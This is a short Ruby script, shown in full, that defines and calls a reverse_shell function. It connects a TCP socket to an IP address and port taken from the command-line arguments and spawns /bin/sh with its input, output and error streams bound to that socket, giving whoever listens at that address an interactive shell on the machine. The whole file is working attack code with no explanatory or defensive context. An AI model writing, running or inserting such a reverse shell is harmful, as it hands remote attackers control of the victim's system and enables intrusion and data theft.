require 'socket'

def reverse_shell(ip, port)
  spawn("/bin/sh", [:in, :out, :err] => TCPSocket.new(ip, port))
end

reverse_shell(ARGV[0], ARGV[1])
